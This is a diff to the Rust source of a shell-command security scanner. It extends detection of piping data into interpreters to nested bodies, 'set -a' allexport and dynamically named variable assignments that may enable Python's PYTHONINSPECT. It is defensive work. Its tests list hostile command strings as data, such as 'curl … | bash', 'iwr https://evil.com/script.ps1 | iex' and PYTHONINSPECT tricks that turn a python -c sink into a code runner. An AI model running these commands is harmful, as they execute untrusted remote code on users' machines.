@@ -866,7 +866,15 @@ pub fn check(
     cwd: Option<&str>,
     scan_context: ScanContext,
 ) -> Vec<Finding> {
-    check_depth(input, shell, cwd, scan_context, 0, true)
+    check_depth(
+        input,
+        shell,
+        cwd,
+        scan_context,
+        0,
+        true,
+        PythonInspectContext::default(),
+    )
 }
 
 fn check_depth(
@@ -876,6 +884,7 @@ fn check_depth(
     scan_context: ScanContext,
     depth: usize,
     analyze_flow: bool,
+    inherited_inspect: PythonInspectContext,
 ) -> Vec<Finding> {
     let mut findings = Vec::new();
     let (input, segments, mut command_budget_exhausted) =
@@ -916,7 +925,7 @@ fn check_depth(
             || s.preceding_separator.as_deref() == Some("|&")
     });
     if has_pipe {
-        check_pipe_to_interpreter(&segments, shell, &mut findings);
+        check_pipe_to_interpreter(&segments, shell, inherited_inspect, &mut findings);
     }
 
     // source/. reuse transport rules: they execute the fetched body.
@@ -1054,7 +1063,10 @@ fn check_depth(
             mitre_id: None,
             custom_rule_id: None,
         });
-    } else {
+    } else if !nested.is_empty() {
+        // A nested body runs with the environment the enclosing command set up
+        // (`export PYTHONINSPECT=1; (… | python3 -c …)`).
+        let nested_inspect = inherited_inspect.extend(&segments, shell);
         for body in nested {
             findings.extend(check_depth(
                 &body.input,
@@ -1063,6 +1075,7 @@ fn check_depth(
                 scan_context,
                 depth + 1,
                 false,
+                nested_inspect,
             ));
         }
     }
@@ -3167,7 +3180,7 @@ fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> 
     // interpreter-control variable) for this one process: inspect mode starts a
     // REPL after the fixed program exits, and that REPL reads the REST OF THE
     // PIPE as code. Assignments elsewhere in the input are checked by the
-    // caller (`input_may_enable_python_inspect`).
+    // caller (`PythonInspectContext::extend`).
     if shell != ShellType::Posix
         || !tokenize::leading_env_assignments(&seg.raw).is_empty()
         || seg.args.iter().any(|arg| {
@@ -3224,6 +3237,35 @@ const ENV_EXPORTING_BUILTINS: &[&str] = &[
     "export", "declare", "typeset", "readonly", "local", "integer", "float", "builtin", "command",
 ];
 
+/// Builtins that assign a variable whose NAME is one of their words. With
+/// allexport on (possibly set before this input was typed) the assignment is
+/// exported, so a non-literal name may be PYTHONINSPECT.
+const NAME_ASSIGNING_BUILTINS: &[&str] = &[
+    "read",
+    "mapfile",
+    "readarray",
+    "getopts",
+    "let",
+    "vared",
+    "zparseopts",
+    "sysread",
+    "zstat",
+];
+
+/// Builtins that assign a named variable only with one option:
+/// `printf -v NAME`, zsh `print -v NAME`, `wait -p NAME`, `strftime -s NAME`.
+const OPTION_ASSIGNING_BUILTINS: &[(&str, &str)] = &[
+    ("printf", "-v"),
+    ("print", "-v"),
+    ("wait", "-p"),
+    ("strftime", "-s"),
+];
+
+/// Commands whose short flags can turn on allexport (`set -a`, `bash -a -c`).
+const ALLEXPORT_FLAG_COMMANDS: &[&str] = &[
+    "set", "setopt", "sh", "bash", "zsh", "dash", "ksh", "mksh", "ash",
+];
+
 /// Words that start a new command inside the same tokenizer segment.
 const COMMAND_START_WORDS: &[&str] = &[
     "!", "time", "if", "then", "elif", "else", "do", "while", "until", "function",
@@ -3231,35 +3273,101 @@ const COMMAND_START_WORDS: &[&str] = &[
 
 const MAX_PYTHON_INSPECT_EVAL_DEPTH: usize = 2;
 
-/// Whether anything in the input (or the inherited environment) may turn on
-/// Python's inspect mode for a later `python -c` pipe sink. Inspect mode runs
-/// the rest of the piped stdin as code after the fixed program exits, so the
-/// issue #136 data-pipeline exemption must not apply.
-///
-/// Conservative by design: a literal `PYTHONINSPECT` anywhere, a dynamic
-/// command name, `eval`/`source`/`.`/`alias`/`enable`, or an exporting builtin
-/// with any non-literal word all refuse the exemption. Pipeline stages run in
-/// subshells, but the check does not rely on that. A shell function or alias
-/// defined before this input was typed cannot be seen here.
-fn input_may_enable_python_inspect(segments: &[tokenize::Segment], shell: ShellType) -> bool {
-    std::env::var_os("PYTHONINSPECT").is_some_and(|value| !value.is_empty())
-        || segments_may_enable_python_inspect(segments, shell, 0)
+/// What a checked command (and the commands enclosing it) may have done to
+/// the environment of a later `python -c` pipe sink. Nested bodies (groups,
+/// substitutions, `sh -c`, `eval`) inherit the enclosing command's context,
+/// because they run with the environment it set up.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+struct PythonInspectContext {
+    /// PYTHONINSPECT may be set in the environment.
+    may_enable: bool,
+    /// allexport may be on, so any assignment may be exported.
+    allexport: bool,
 }
 
+impl PythonInspectContext {
+    /// This context plus whatever `segments` may do.
+    fn extend(self, segments: &[tokenize::Segment], shell: ShellType) -> Self {
+        let allexport = self.allexport || segments_may_enable_allexport(segments, shell);
+        let may_enable = self.may_enable
+            || std::env::var_os("PYTHONINSPECT").is_some_and(|value| !value.is_empty())
+            || segments_may_enable_python_inspect(segments, shell, 0, allexport);
+        Self {
+            may_enable,
+            allexport,
+        }
+    }
+}
+
+/// Whether anything in the input may turn on the shell's allexport option:
+/// a literal `allexport` / `ALL_EXPORT` option name anywhere (`set -o`,
+/// `setopt`, `shopt -o`), a short flag word containing `a` after `set`,
+/// `setopt` or a shell name (`set -ea`, `bash -a -c`), or a non-literal word
+/// after one of them (`set -$FLAGS`). Conservative: `set +a` also counts.
+fn segments_may_enable_allexport(segments: &[tokenize::Segment], shell: ShellType) -> bool {
+    segments.iter().any(|seg| {
+        let mut after_flag_command = false;
+        for word in seg.command.iter().chain(seg.args.iter()) {
+            let word = word.trim_start_matches(['(', '{']);
+            if word.is_empty() {
+                continue;
+            }
+            if !command_word_is_statically_bound(word, shell) {
+                if after_flag_command {
+                    return true;
+                }
+                continue;
+            }
+            for token in normalize_shell_token(word, shell).split_whitespace() {
+                let folded = token.replace('_', "").to_ascii_lowercase();
+                if folded.contains("allexport") {
+                    return true;
+                }
+                if after_flag_command
+                    && token.len() > 1
+                    && token.starts_with(['-', '+'])
+                    && !token.starts_with("--")
+                    && token[1..].contains('a')
+                {
+                    return true;
+                }
+                if ALLEXPORT_FLAG_COMMANDS.contains(&normalize_cmd_base(token, shell).as_str()) {
+                    after_flag_command = true;
+                }
+            }
+        }
+        false
+    })
+}
+
+/// Whether anything in the segments may turn on Python's inspect mode for a
+/// later `python -c` pipe sink. Inspect mode runs the rest of the piped stdin
+/// as code after the fixed program exits, so the issue #136 data-pipeline
+/// exemption must not apply.
+///
+/// Conservative by design: a literal `PYTHONINSPECT` anywhere, a dynamic
+/// command name, `eval`/`source`/`.`/`alias`/`enable`, an exporting or
+/// name-assigning builtin with any non-literal word, or any non-literal word
+/// while allexport may be on all refuse the exemption. Pipeline stages run in
+/// subshells, but the check does not rely on that. Shell state from before
+/// this input was typed (functions, aliases, an already-on allexport) cannot
+/// be seen here, apart from an inherited PYTHONINSPECT (checked by the caller).
 fn segments_may_enable_python_inspect(
     segments: &[tokenize::Segment],
     shell: ShellType,
     depth: usize,
+    allexport: bool,
 ) -> bool {
     segments
         .iter()
-        .any(|seg| segment_may_enable_python_inspect(seg, shell, depth))
+        .any(|seg| segment_may_enable_python_inspect(seg, shell, depth, allexport))
 }
 
 fn segment_may_enable_python_inspect(
     seg: &tokenize::Segment,
     shell: ShellType,
     depth: usize,
+    allexport: bool,
 ) -> bool {
     if seg.raw.contains("PYTHONINSPECT") {
         return true;
@@ -3277,7 +3385,13 @@ fn segment_may_enable_python_inspect(
     {
         return true;
     }
-    let mut exporting = false;
+    let has_dynamic_word = words
+        .iter()
+        .any(|word| !command_word_is_statically_bound(word, shell));
+    if allexport && has_dynamic_word {
+        return true;
+    }
+    let mut assigning = false;
     let mut eval_at = None;
     for (index, word) in words.iter().enumerate() {
         if !command_word_is_statically_bound(word, shell) {
@@ -3298,17 +3412,27 @@ fn segment_may_enable_python_inspect(
             "eval" => {
                 eval_at.get_or_insert(index);
             }
-            base if ENV_EXPORTING_BUILTINS.contains(&base) => exporting = true,
-            _ => {}
+            base if ENV_EXPORTING_BUILTINS.contains(&base)
+                || NAME_ASSIGNING_BUILTINS.contains(&base) =>
+            {
+                assigning = true
+            }
+            base => {
+                if let Some((_, option)) = OPTION_ASSIGNING_BUILTINS
+                    .iter()
+                    .find(|(builtin, _)| *builtin == base)
+                {
+                    assigning |= words[index + 1..]
+                        .iter()
+                        .any(|arg| normalize_shell_token(arg, shell).starts_with(option));
+                }
+            }
         }
     }
-    if !exporting && eval_at.is_none() {
+    if !assigning && eval_at.is_none() {
         return false;
     }
-    if words
-        .iter()
-        .any(|word| !command_word_is_statically_bound(word, shell))
-    {
+    if has_dynamic_word {
         return true;
     }
     let Some(eval_at) = eval_at else {
@@ -3322,12 +3446,15 @@ fn segment_may_enable_python_inspect(
         .map(|word| normalize_shell_token(word, shell))
         .collect::<Vec<_>>()
         .join(" ");
-    segments_may_enable_python_inspect(&tokenize::tokenize(&body, shell), shell, depth + 1)
+    let body_segments = tokenize::tokenize(&body, shell);
+    let allexport = allexport || segments_may_enable_allexport(&body_segments, shell);
+    segments_may_enable_python_inspect(&body_segments, shell, depth + 1, allexport)
 }
 
 fn check_pipe_to_interpreter(
     segments: &[tokenize::Segment],
     shell: ShellType,
+    inherited_inspect: PythonInspectContext,
     findings: &mut Vec<Finding>,
 ) {
     let mut inspect_may_be_enabled = None;
@@ -3352,8 +3479,9 @@ fn check_pipe_to_interpreter(
                     // blocking via the fetch-source path below.
                     if !is_url_fetch_command(&source_base)
                         && is_python_dash_c_data_pipeline(seg, shell)
-                        && !*inspect_may_be_enabled
-                            .get_or_insert_with(|| input_may_enable_python_inspect(segments, shell))
+                        && !inspect_may_be_enabled
+                            .get_or_insert_with(|| inherited_inspect.extend(segments, shell))
+                            .may_enable
                     {
                         continue;
                     }
@@ -12075,6 +12203,62 @@ mod tests {
         }
     }
 
+    /// Bug 4 follow-up: the PYTHONINSPECT decision covers the whole checked
+    /// command. A pipe inside a group, substitution, `sh -c` or `eval` body
+    /// inherits an export from the enclosing command. With allexport on
+    /// (`set -a`), an assignment whose variable name is not literal
+    /// (`printf -v "$N"`) may export PYTHONINSPECT too.
+    #[test]
+    fn python_inspect_reaches_nested_bodies_and_allexport_dynamic_assignments() {
+        for input in [
+            // Nested bodies inherit the enclosing command's environment.
+            "export PYTHONINSPECT=1; (echo hi | python3 -c 'print(1)')",
+            "export PYTHONINSPECT=1; { echo hi | python3 -c 'print(1)'; }",
+            "export PYTHONINSPECT=1; x=$(echo hi | python3 -c 'print(1)')",
+            "export PYTHONINSPECT=1; bash -c 'echo hi | python3 -c \"print(1)\"'",
+            "PYTHONINSPECT=1 bash -c 'echo hi | python3 -c \"print(1)\"'",
+            "env PYTHONINSPECT=1 sh -c 'echo hi | python3 -c \"print(1)\"'",
+            "export PYTHONINSPECT=1; eval \"echo hi | python3 -c 'print(1)'\"",
+            "export PYTHON\"INSPECT\"=1; (echo hi | python3 -c 'print(1)')",
+            "export PYTHONINSPECT=1; (bash -c 'echo hi | python3 -c \"print(1)\"')",
+            // allexport exports every assignment, including dynamically named ones.
+            "set -a; printf -v \"$(echo PYTHON)INSPECT\" 1; echo payload | python3 -c 'print(1)'",
+            "set -o allexport; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "set -ea; let \"$N=1\"; echo payload | python3 -c 'print(1)'",
+            "setopt allexport; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "setopt ALL_EXPORT; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "shopt -so allexport; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "set -$FLAGS; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "set -a; printf -v PYTHONINSPEC? 1; echo payload | python3 -c 'print(1)'",
+            "set -a; (printf -v \"$N\" 1; echo payload | python3 -c 'print(1)')",
+            "set -a; bash -c 'printf -v \"$N\" 1; echo payload | python3 -c \"print(1)\"'",
+            // allexport may already be on in the interactive shell, so a
+            // builtin that assigns a non-literal variable name is refused too.
+            "set -e; printf -v \"$N\" 1; echo hi | python3 -c 'print(1)'",
+            "read -r \"$N\" <<< 1; echo hi | python3 -c 'print(1)'",
+            "wait -p \"$N\"; echo hi | python3 -c 'print(1)'",
+            "printf '-v' \"$N\" 1; echo hi | python3 -c 'print(1)'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "PYTHONINSPECT source was not refused: {input:?}"
+            );
+        }
+        // Nested data pipelines and non-exporting dynamic assignments keep the
+        // issue #136 exemption.
+        for input in [
+            "(echo hi | python3 -c 'print(1)')",
+            "{ echo hi | python3 -c 'print(1)'; }",
+            "bash -c 'echo hi | python3 -c \"print(1)\"'",
+            "export FOO=bar; (echo hi | python3 -c 'print(1)')",
+            "set -a; FOO=bar; echo hi | python3 -c 'print(1)'",
+            "read -r line; echo hi | python3 -c 'print(1)'",
+            "printf '%s' \"$DATA\" | python3 -c 'import sys; print(sys.stdin.read())'",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input:?}");
+        }
+    }
+
     #[test]
     fn issue_264_python_program_selection_cannot_be_changed_by_later_dash_c() {
         for input in [
@@ -16586,7 +16770,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].description.contains("getvet.sh"),
@@ -16604,7 +16793,12 @@ mod tests {
         let input = r#"curl "https://example.com/install.sh" | bash"#;
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].evidence.iter().any(
@@ -16619,7 +16813,12 @@ mod tests {
         let input = "curl --url=https://example.com/install.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].evidence.iter().any(
@@ -16634,7 +16833,12 @@ mod tests {
         let input = "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
 
         let urls: Vec<&str> = findings[0]
@@ -16660,7 +16864,12 @@ mod tests {
         let input = "cat /tmp/script.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains("getvet.sh"),
@@ -16677,7 +16886,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | command -- bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1, "should detect bash after --");
     }
 
@@ -16686,7 +16900,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | sudo -- bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1, "should detect bash after sudo --");
         assert!(
             findings[0].description.contains("interpreter 'bash'"),
@@ -16720,7 +16939,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | sudo -iu root bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(
             findings.len(),
             1,
@@ -16738,7 +16962,12 @@ mod tests {
         let input = "iwr https://evil.com/script.ps1 | iex";
         let segments = tokenize::tokenize(input, ShellType::PowerShell);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::PowerShell, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::PowerShell,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].description.contains("getvet.sh"),
@@ -16755,7 +16984,12 @@ mod tests {
         let input = "curl https://example.com/\x1b[31mred | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains('\x1b'),
@@ -16774,7 +17008,12 @@ mod tests {
         let input = "curl \"https://example.com/\nFAKE: safe\" | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains("FAKE")
